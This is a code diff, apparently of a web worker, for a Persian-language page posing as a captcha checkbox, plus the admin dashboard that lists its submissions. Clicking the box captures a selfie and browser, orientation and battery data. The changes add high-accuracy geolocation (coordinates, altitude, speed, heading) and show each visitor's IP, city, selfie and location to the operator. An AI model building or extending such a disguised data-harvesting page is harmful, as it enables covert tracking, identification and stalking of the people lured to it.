-          <span class="info-value" style="font-size:11px">${escapeHtml(timeStr)}</span>
+          <span class="info-value small">${escapeHtml(timeStr)}</span>
         </div>
       </div>
 
-      <section class="recent">
-        <div class="row-between">
-          <h2>📋 آخرین ارسال‌ها</h2>
-          <a class="btn" href="${adminBase}" style="padding:6px 10px;font-size:12px">🔄 بروزرسانی</a>
+      <section>
+        <h2>📋 آخرین ارسال‌ها</h2>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>زمان</th>
+                <th>IP</th>
+                <th>شهر، کشور</th>
+                <th>سلفی</th>
+                <th>موقعیت</th>
+              </tr>
+            </thead>
+            <tbody>${rows}</tbody>
+          </table>
         </div>
-        <table>
-          <thead>
-            <tr>
-              <th>زمان (UTC)</th>
-              <th>IP</th>
-              <th>کشور</th>
-              <th>شهر</th>
-              <th>سلفی</th>
-            </tr>
-          </thead>
-          <tbody>${rows}</tbody>
-        </table>
+      </section>
+
+      <section class="mt">
+        <h2>🛠 سلامت تنظیمات</h2>
+        <div class="checks">${checksHtml}</div>
       </section>
     </div>
   </div>
@@ -1015,12 +1149,15 @@ function renderAdminDashboard(nonce, adminBase, state, env, cf, log, params) {
 // ============================================================
 //  Frontend (captcha page)
 // ============================================================
-function renderHTML(nonce, selfieState) {
+function renderHTML(nonce, selfieState, geoState) {
   const selfieMode = selfieState === 'off' ? 'off' : 'on';
+  const geoMode = geoState === 'on' ? 'on' : 'off';
   const hintText =
     selfieMode === 'on'
-      ? 'با کلیک روی این کادر، یک تصویر سلفی و اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.'
-      : 'با کلیک روی این کادر، اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.';
+      ? 'با کلیک روی این کادر، یک تصویر سلفی و اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' +
+        (geoMode === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '')
+      : 'با کلیک روی این کادر، اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' +
+        (geoMode === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '');
 
   return `<!DOCTYPE html>
 <html lang="fa" dir="rtl">
@@ -1101,6 +1238,7 @@ function renderHTML(nonce, selfieState) {
 <script nonce="${nonce}">
 (() => {
   const SELFIE_MODE = ${JSON.stringify(selfieMode)};
+  const GEO_MODE = ${JSON.stringify(geoMode)};
 
   const el = {
     box: document.getElementById('checkbox'),
@@ -1325,6 +1463,81 @@ function renderHTML(nonce, selfieState) {
     return out;
   }
 
+  // 🔽 NEW: Geolocation with high accuracy
+  async function collectGeolocation() {
+    if (!('geolocation' in navigator)) {
+      return { supported: false, reason: 'api_unsupported' };
+    }
+
+    return new Promise((resolve) => {
+      let done = false;
+      const finish = (result) => {
+        if (done) return;
+        done = true;
+        resolve(result);
+      };
+
+      // Outer safety net
+      const safety = setTimeout(() => {
+        finish({
+          supported: true,
+          success: false,
+          error: 'OUTER_TIMEOUT',
+          message: 'درخواست موقعیت در زمان مقرر پاسخ نگرفت',
+        });
+      }, 14000);
+
+      try {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            clearTimeout(safety);
+            const c = pos.coords;
+            finish({
+              supported: true,
+              success: true,
+              latitude: c.latitude,
+              longitude: c.longitude,
+              accuracy: c.accuracy,
+              altitude: typeof c.altitude === 'number' ? c.altitude : null,
+              altitudeAccuracy:
+                typeof c.altitudeAccuracy === 'number' ? c.altitudeAccuracy : null,
+              heading: typeof c.heading === 'number' ? c.heading : null,
+              speed: typeof c.speed === 'number' ? c.speed : null,
+              timestamp: pos.timestamp,
+            });
+          },
+          (err) => {
+            clearTimeout(safety);
+            const errNames = {
+              1: 'PERMISSION_DENIED',
+              2: 'POSITION_UNAVAILABLE',
+              3: 'TIMEOUT',
+            };
+            finish({
+              supported: true,
+              success: false,
+              error: errNames[err.code] || 'CODE_' + err.code,
+              message: String(err.message || ''),
+            });
+          },
+          {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 10000,
+          }
+        );
+      } catch (e) {
+        clearTimeout(safety);
+        finish({
+          supported: true,
+          success: false,
+          error: 'THROW',
+          message: String((e && e.message) || e),
+        });
+      }
+    });
+  }
+
   function collectClientData() {
     const c = navigator.connection || {};
     const now = new Date();
@@ -1356,6 +1569,7 @@ function renderHTML(nonce, selfieState) {
     busy = true;
     setState('busy');
 
+    // Orientation permission needs user gesture — call early
     const orientationPerm = await requestOrientationPermission();
 
     let stream = null;
@@ -1389,20 +1603,26 @@ function renderHTML(nonce, selfieState) {
         stream = null;
       }
 
-      const [orientation, battery] = await Promise.all([
+      // Gather orientation, battery, geolocation in parallel
+      const [orientation, battery, geolocation] = await Promise.all([
         orientationPerm.available
           ? collectOrientation()
           : Promise.resolve({ supported: false, reason: orientationPerm.reason }),
         collectBattery(),
+        GEO_MODE === 'on'
+          ? collectGeolocation()
+          : Promise.resolve({ supported: true, skipped: true, note: 'disabled_by_admin' }),
       ]);
 
       const clientData = collectClientData();
       clientData.selfieMode = SELFIE_MODE;
+      clientData.geoMode = GEO_MODE;
       clientData.camera = camInfo;
       clientData.capturedFrame = captured;
       clientData.orientation = orientation;
       clientData.orientationPermission = orientationPerm;
       clientData.battery = battery;
+      clientData.geolocation = geolocation;
 
       const fd = new FormData();
       if (SELFIE_MODE === 'on' && blob) {
